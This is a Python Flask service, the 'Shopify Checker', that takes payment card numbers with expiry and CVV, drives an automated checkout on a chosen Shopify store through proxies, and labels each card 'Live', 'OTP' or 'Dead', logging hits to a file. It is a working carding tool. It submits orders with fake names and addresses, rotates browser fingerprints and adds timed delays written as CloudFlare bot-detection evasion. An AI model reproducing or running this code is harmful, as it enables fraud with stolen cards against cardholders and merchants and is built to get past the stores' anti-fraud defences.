import asyncio
import json
import re
import random
import threading
import os
import logging
import base64
import hashlib
import time
from urllib.parse import urlparse
from typing import Tuple, Dict, Any, Optional
from flask import Flask, request, jsonify

from curl_cffi.requests import AsyncSession, RequestsError

from graphql import QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_DELIVERY, MUTATION_SUBMIT, QUERY_POLL

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger("shopify_checker")

ADDRESS_BOOK = {
    "US": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"},
    "CA": {"address1": "700 2 St SW", "address2": "", "city": "Calgary", "zoneCode": "AB", "postalCode": "T2P 2W2", "countryCode": "CA", "phone": "+14035550187"},
    "GB": {"address1": "100 New Bridge St", "address2": "", "city": "London", "zoneCode": "LND", "postalCode": "EC4V 6JA", "countryCode": "GB", "phone": "+442079460912"},
    "AU": {"address1": "100 George St", "address2": "", "city": "Sydney", "zoneCode": "NSW", "postalCode": "2000", "countryCode": "AU", "phone": "+61291234567"},
    "DE": {"address1": "Friedrichstraße 43", "address2": "", "city": "Berlin", "zoneCode": "BE", "postalCode": "10117", "countryCode": "DE", "phone": "+493012345678"},
    "FR": {"address1": "8 Boulevard de la Madeleine", "address2": "", "city": "Paris", "zoneCode": "IDF", "postalCode": "75009", "countryCode": "FR", "phone": "+33142685300"},
    "IN": {"address1": "Bandra Kurla Complex", "address2": "", "city": "Mumbai", "zoneCode": "MH", "postalCode": "400051", "countryCode": "IN", "phone": "+919820012345"},
    "AE": {"address1": "Sheikh Zayed Rd", "address2": "", "city": "Dubai", "zoneCode": "DU", "postalCode": "00000", "countryCode": "AE", "phone": "+97143321111"},
    "DEFAULT": {"address1": "1201 N Market St", "address2": "Suite 100", "city": "Wilmington", "zoneCode": "DE", "postalCode": "19801", "countryCode": "US", "phone": "+13025550143"}
}

CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU",
    "EUR": "DE", "INR": "IN", "AED": "AE", "HKD": "HK",
    "CHF": "CH", "NZD": "NZ", "SGD": "SG", "JPY": "JP"
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-US,en;q=0.8,es;q=0.6",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-GB,en;q=0.9",
]

_VARIANT_CACHE = {}
_cache_lock = threading.Lock()
_file_lock = threading.Lock()
_HITS_FILE = '/sock/hits.txt' if os.path.isdir('/sock') else 'hits.txt'

class Utils:
    @staticmethod
    def get_random_name() -> Tuple[str, str]:
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return random.choice(first_names), random.choice(last_names)
    
    @staticmethod
    def generate_email(first: str, last: str) -> str:
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def resolve_address(url: str, currency: Optional[str] = None) -> Dict[str, str]:
    domain = urlparse(url if url.startswith("http") else f"https://{url}").netloc.lower()
    tld = domain.split(".")[-1].upper()
    if tld in ADDRESS_BOOK: return ADDRESS_BOOK[tld]
    if currency:
        country_code = CURRENCY_TO_COUNTRY.get(currency.upper())
        if country_code and country_code in ADDRESS_BOOK: return ADDRESS_BOOK[country_code]
    return ADDRESS_BOOK["DEFAULT"]

def extract_between(text: str, start: str, end: str) -> Optional[str]:
    if not text or not start or not end: return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]: return parts[1].split(end, 1)[0]
    except Exception: pass
    return None

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("http://", "https://", "socks5://")): return proxy_str
    if '@' in proxy_str: return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def get_curl_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    p = parse_proxy(proxy_str)
    if p: return {"http": p, "https": p}
    return None

def is_captcha_required(response_text: str) -> bool:
    if not response_text: return False
    indicators = [
        'CAPTCHA_REQUIRED', 'captcha required', 'CAPTCHA CHALLENGE',
        'hcaptcha', 'h-captcha', 'cf-browser-verification', 'cf-turnstile', 'datadome',
        'challenge', 'javascript required', 'bot check', 'cf_clearance'
    ]
    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)

def extract_clean_response(message: str) -> str:
    if not message: return "UNKNOWN_ERROR"
    message = str(message)
    if "GraphQL Error:" in message: return message[:150].strip()
    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)', r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"', r"'code':'([^']+)'"
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        if matches:
            match = matches[0]
            if isinstance(match, tuple): match = match[0]
            if "_" in match and len(match) < 50: return match.strip("{}:'\" ")
    words = message.split()
    if words and "_" in words[0] and words[0].isupper(): return words[0]
    return message[:50]

def parse_cc_string(cc_string: str) -> Dict[str, str]:
    parts = cc_string.split('|')
    if len(parts) != 4: raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()}

def save_hit_to_file(cc_string: str, status: str, gateway: str = "", price: str = ""):
    try:
        with _file_lock:
            with open(_HITS_FILE, "a") as f:
                f.write(f"[{status}] {cc_string} - Gateway: {gateway} - Price: {price}\n")
    except Exception as exc: logger.error(f"save_hit_to_file error: {exc}")

def _classify_status(success: bool, response_text: str) -> Optional[str]:
    if not response_text: return None
    upper_text = response_text.upper()
    if "ORDER_PLACED" in upper_text: return "ORDER_PLACED"
    if "INSUFFICIENT_FUNDS" in upper_text or "INSUFFICIENT FUNDS" in upper_text: return "INSUFFICIENT_FUNDS"
    if "OTP" in upper_text or "3DS" in upper_text or "AUTHENTICATION_REQUIRED" in upper_text: return "OTP_REQUIRED"
    return None

class ShopifyCheckoutSession:
    def __init__(self, site_url: str, cc_info: Dict[str, str], variant_id: Optional[str] = None):
        if site_url.startswith('http://'): self.site_url = site_url.replace('http://', 'https://')
        elif not site_url.startswith('https://'): self.site_url = f'https://{site_url}'
        else: self.site_url = site_url
            
        self.domain = urlparse(self.site_url).netloc
        self.cc_info = cc_info
        self.variant_id = variant_id
        self.checkout_id = None
        self.token = None
        self.gateway = "UNKNOWN"
        self.running_total = 0.0
        self.currency = "USD"
        self.subtotal = 0.0
        self.tax_amount = 0.0
        self.shipping_amount = 0.0
        self.sessionInput = {"sessionToken": ""}
        self.attemptToken = ""
        self._last_request_time = time.time()
        self._request_count = 0
        
    def get_navigate_headers(self) -> Dict[str, str]:
        """Generate browser-like headers with proper ordering and randomization."""
        return {
            'Host': self.domain,
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(ACCEPT_LANGS),
            'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"' if 'Windows' in random.choice(USER_AGENTS) else '"macOS"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
        }

    def get_graphql_headers(self, referer: str = None) -> Dict[str, str]:
        """Generate headers for GraphQL requests with proper CloudFlare handling."""
        headers = {
            'Host': self.domain,
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(ACCEPT_LANGS),
            'Content-Type': 'application/json',
            'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"' if 'Windows' in random.choice(USER_AGENTS) else '"macOS"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Requested-With': 'XMLHttpRequest',
        }
        if referer:
            headers['Referer'] = referer
        return headers

    async def _intelligent_delay(self):
        """CloudFlare time-based heuristic evasion - add varying delays."""
        elapsed = time.time() - self._last_request_time
        if elapsed < 0.5:
            await asyncio.sleep(random.uniform(0.8, 1.5))
        elif elapsed < 1.5:
            await asyncio.sleep(random.uniform(0.3, 0.8))
        self._request_count += 1
        if self._request_count % 5 == 0:
            await asyncio.sleep(random.uniform(1.0, 2.0))
        self._last_request_time = time.time()

    async def fetch_product_if_needed(self, session) -> Tuple[bool, str]:
        try:
            await self._intelligent_delay()
            headers = self.get_navigate_headers()
            headers['Referer'] = self.site_url
            
            resp = await session.get(f"{self.site_url}/products", headers=headers, timeout=15)
            if resp.status_code != 200:
                return False, f"Product fetch failed: {resp.status_code}"
            
            if not self.variant_id:
                variant_match = re.search(r'"id":"(\d+)".*?"title":"([^"]+)"', resp.text)
                if variant_match:
                    self.variant_id = variant_match.group(1)
            
            return True, "OK"
        except Exception as e:
            return False, f"Product fetch error: {str(e)}"

    async def add_to_cart(self, session) -> Tuple[bool, str]:
        try:
            await self._intelligent_delay()
            headers = self.get_graphql_headers(f"{self.site_url}/products")
            
            payload = {"quantity": 1, "variantId": self.variant_id}
            resp = await session.post(f"{self.site_url}/cart/add.js", json=payload, headers=headers, timeout=15)
            
            if resp.status_code == 200 and 'cart' in resp.text:
                return True, "OK"
            return False, f"Cart add failed: {resp.text[:100]}"
        except Exception as e:
            return False, f"Cart error: {str(e)}"

    async def init_checkout(self, session) -> Tuple[bool, str]:
        try:
            await self._intelligent_delay()
            headers = self.get_navigate_headers()
            headers['Referer'] = self.site_url
            
            resp = await session.get(f"{self.site_url}/checkout", headers=headers, timeout=15, allow_redirects=True)
            
            if is_captcha_required(resp.text):
                return False, "CAPTCHA_REQUIRED"
            
            token_match = re.search(r'"sessionToken":"([^"]+)"', resp.text)
            if token_match:
                self.sessionInput['sessionToken'] = token_match.group(1)
            
            checkout_id_match = re.search(r'"id":"([^"]+)".*?"subtotal"', resp.text)
            if checkout_id_match:
                self.checkout_id = checkout_id_match.group(1)
            
            return True, "OK"
        except Exception as e:
            return False, f"Checkout init error: {str(e)}"

    async def negotiate_shipping(self, session) -> Tuple[bool, str]:
        try:
            await self._intelligent_delay()
            headers = self.get_graphql_headers(f"{self.site_url}/checkout")
            
            address = resolve_address(self.site_url)
            variables = {
                "sessionInput": self.sessionInput,
                "delivery": {
                    "address": {
                        "address1": address['address1'],
                        "address2": address['address2'],
                        "city": address['city'],
                        "countryCode": address['countryCode'],
                        "provinceCode": address['zoneCode'],
                        "zip": address['postalCode'],
                    }
                }
            }
            
            payload = {"query": QUERY_PROPOSAL_SHIPPING, "variables": variables}
            resp = await session.post(f"{self.site_url}/api/checkout/graphql.json", json=payload, headers=headers, timeout=20)
            
            if is_captcha_required(resp.text):
                return False, "CAPTCHA_REQUIRED"
            
            try:
                data = resp.json()
                if 'errors' in data:
                    return False, str(data['errors'][0]) if data['errors'] else "GQL_ERROR"
                
                result = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                if 'redirectUrl' in result:
                    return False, "CHECKPOINT_DENIED"
                
                return True, "OK"
            except:
                return False, "Response parse error"
        except Exception as e:
            return False, f"Shipping error: {str(e)}"

    async def negotiate_delivery(self, session) -> Tuple[bool, str]:
        try:
            await self._intelligent_delay()
            headers = self.get_graphql_headers(f"{self.site_url}/checkout")
            
            variables = {
                "sessionInput": self.sessionInput,
                "delivery": {
                    "selectedDeliveryMethodPresentation": "FASTEST"
                }
            }
            
            payload = {"query": QUERY_PROPOSAL_DELIVERY, "variables": variables}
            resp = await session.post(f"{self.site_url}/api/checkout/graphql.json", json=payload, headers=headers, timeout=20)
            
            if is_captcha_required(resp.text):
                return False, "CAPTCHA_REQUIRED"
            
            return True, "OK"
        except Exception as e:
            return False, f"Delivery error: {str(e)}"

    async def tokenize_card(self, session) -> Tuple[bool, str]:
        try:
            await self._intelligent_delay()
            headers = self.get_graphql_headers(f"{self.site_url}/checkout")
            headers['Content-Type'] = 'application/json'
            
            card_data = {
                "number": self.cc_info['cc'],
                "expiryMonth": int(self.cc_info['mes']),
                "expiryYear": int(self.cc_info['ano']),
                "cvc": self.cc_info['cvv']
            }
            
            payload = {"cardData": card_data}
            resp = await session.post(
                f"{self.site_url}/api/payment_methods/tokenize",
                json=payload,
                headers=headers,
                timeout=20
            )
            
            if resp.status_code == 200:
                token = resp.text.strip('"')
                return True, token
            
            return False, f"Tokenize failed: {resp.text[:100]}"
        except Exception as e:
            return False, f"Tokenize error: {str(e)}"

    async def submit_payment(self, session, payment_token: str) -> Tuple[bool, str, str]:
        try:
            await self._intelligent_delay()
            headers = self.get_graphql_headers(f"{self.site_url}/checkout")
            
            variables = {
                "input": {
                    "sessionInput": self.sessionInput,
                    "payment": {
                        "paymentMethod": {
                            "cardPaymentMethod": {
                                "cardToken": payment_token,
                                "cardholderName": f"{random.choice(['John', 'Michael', 'David'])} {random.choice(['Smith', 'Johnson', 'Williams'])}",
                                "billingAddress": {
                                    "address1": "1201 N Market St",
                                    "city": "Wilmington",
                                    "countryCode": "US",
                                    "provinceCode": "DE",
                                    "zip": "19801"
                                }
                            }
                        }
                    }
                },
                "attemptToken": self.attemptToken
            }
            
            payload = {"query": MUTATION_SUBMIT, "variables": variables}
            resp = await session.post(f"{self.site_url}/api/checkout/graphql.json", json=payload, headers=headers, timeout=20)
            
            if is_captcha_required(resp.text):
                return False, "CAPTCHA_REQUIRED", None
            
            try:
                data = resp.json()
                receipt = data.get('data', {}).get('submitForCompletion', {}).get('receipt', {})
                typename = receipt.get('__typename', '')
                
                if typename == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", receipt.get('id')
                elif typename == 'ProcessingReceipt' or typename == 'WaitingReceipt':
                    return True, "POLL", receipt.get('id')
                elif typename == 'ActionRequiredReceipt':
                    return True, "OTP_REQUIRED", receipt.get('id')
                else:
                    error = data.get('data', {}).get('submitForCompletion', {}).get('errors', [{}])[0]
                    return False, error.get('code', 'SUBMIT_ERROR'), None
            except:
                return False, "Submit response parse error", None
        except Exception as e:
            return False, f"Submit error: {str(e)}", None

    async def poll_receipt(self, session, receipt_id: str, max_polls: int = 15) -> Tuple[bool, str]:
        try:
            for poll_attempt in range(max_polls):
                await asyncio.sleep(random.uniform(2.0, 4.0))
                await self._intelligent_delay()
                
                headers = self.get_graphql_headers(f"{self.site_url}/checkout")
                variables = {"receiptId": receipt_id, "sessionToken": self.sessionInput['sessionToken']}
                payload = {"query": QUERY_POLL, "variables": variables}
                
                resp = await session.post(f"{self.site_url}/api/checkout/graphql.json", json=payload, headers=headers, timeout=20)
                
                if is_captcha_required(resp.text):
                    return False, "CAPTCHA_REQUIRED"
                
                try:
                    data = resp.json()
                    receipt = data.get('data', {}).get('receipt', {})
                    typename = receipt.get('__typename', '')
                    
                    if typename == 'ProcessedReceipt':
                        return True, "ORDER_PLACED"
                    elif typename == 'ActionRequiredReceipt':
                        return True, "OTP_REQUIRED"
                    elif typename == 'FailedReceipt':
                        error = receipt.get('processingError', {})
                        return False, error.get('code', 'PAYMENT_FAILED')
                except:
                    pass
            
            return False, "POLL_TIMEOUT"
        except Exception as e:
            return False, f"Poll error: {str(e)}"

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None) -> Tuple[bool, str, str, str, str, str, float, float]:
    cc_info = {'cc': cc, 'mes': mes, 'ano': ano, 'cvv': cvv}
    checkout = ShopifyCheckoutSession(site_url, cc_info, variant_id)
    proxies = get_curl_proxy(proxy_str)
    
    try:
        async with AsyncSession(impersonate="chrome124", proxies=proxies, timeout=60) as session:
            
            try:
                warmup_headers = checkout.get_navigate_headers()
                resp = await session.get(checkout.site_url, headers=warmup_headers, timeout=15, allow_redirects=True)
                final_url = str(resp.url).split('?')[0].rstrip('/')
                checkout.site_url = final_url
                checkout.domain = urlparse(final_url).netloc
                
                await asyncio.sleep(random.uniform(0.5, 1.2))
                await session.get(f"{checkout.site_url}/cart", headers=warmup_headers, timeout=10)
                await asyncio.sleep(random.uniform(0.8, 1.5))
            except Exception: pass
                
            ok, msg = await checkout.fetch_product_if_needed(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, msg = await checkout.add_to_cart(session)
            if not ok:
                with _cache_lock:
                    if checkout.site_url in _VARIANT_CACHE: del _VARIANT_CACHE[checkout.site_url]
                checkout.variant_id = None
                ok, msg = await checkout.fetch_product_if_needed(session)
                if ok: ok, msg = await checkout.add_to_cart(session)
                if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(1.5, 2.5))
            
            ok, msg = await checkout.init_checkout(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(1.5, 2.5))
            ok, msg = await checkout.negotiate_shipping(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, msg = await checkout.negotiate_delivery(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, token_msg = await checkout.tokenize_card(session)
            if not ok: return False, token_msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, status, rid = await checkout.submit_payment(session, token_msg)
            if not ok: return False, status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            if status != "POLL": return True, status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, final_status = await checkout.poll_receipt(session, rid)
            return ok, final_status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount

    except RequestsError as e: return False, f"Proxy/TLS Error: {str(e)}", checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
    except asyncio.TimeoutError: return False, "Network Timeout", checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
    except Exception as e: return False, f"Process Error: {str(e)}", checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc', '').strip()
        proxy_str = request.args.get('proxy')
        variant_id = request.args.get('variant')
        
        if not site: return jsonify({"error": "Missing 'site' parameter", "status": "Dead"}), 400
        if not cc_string: return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": "Dead"}), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc, mes, ano, cvv = cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv']
        except ValueError as e:
            return jsonify({"error": str(e), "status": "Dead"}), 400
        
        success, message, gateway, price, currency, subtotal, tax, ship = asyncio.run(
            process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
        )
        
        clean_response = extract_clean_response(message)
        hit_status = _classify_status(success, clean_response)

        try:
            sub_val = float(subtotal) if subtotal else 0.0
            tax_val = float(tax) if tax else 0.0
            ship_val = float(ship) if ship else 0.0
            total_val = sub_val + tax_val + ship_val
            price_str = f"${total_val:.2f} [Min Prod: ${sub_val:.2f} | Tax: ${tax_val:.2f} | Ship: ${ship_val:.2f}]"
        except (ValueError, TypeError):
            price_str = f"Sum Error [Min Prod: {subtotal} | Tax: {tax} | Ship: {ship}]"

        if hit_status in ["ORDER_PLACED", "INSUFFICIENT_FUNDS"]: final_status = "Live"
        elif hit_status == "OTP_REQUIRED": final_status = "OTP"
        else: final_status = "Dead"

        return jsonify({
            "Currency": currency, "Gateway": gateway, "Price": price_str,
            "RawResponse": message, "Response": clean_response, "Status": final_status, "cc": cc_string
        })
        
    except Exception as e:
        logger.error(f"Flask API Error: {str(e)}")
        return jsonify({
            "Currency": "USD", "Gateway": "UNKNOWN", "Price": "$0.00 [Min Prod: $0.00 | Tax: $0.00 | Ship: $0.00]",
            "RawResponse": str(e), "Response": "ERROR", "Status": "Dead", "cc": request.args.get('cc', '')
        }), 500

@app.route("/")
def home():
    return "<h1>Welcome to my app 🚀</h1><p>Server is running.</p>"

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Starting Shopify Checker API on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)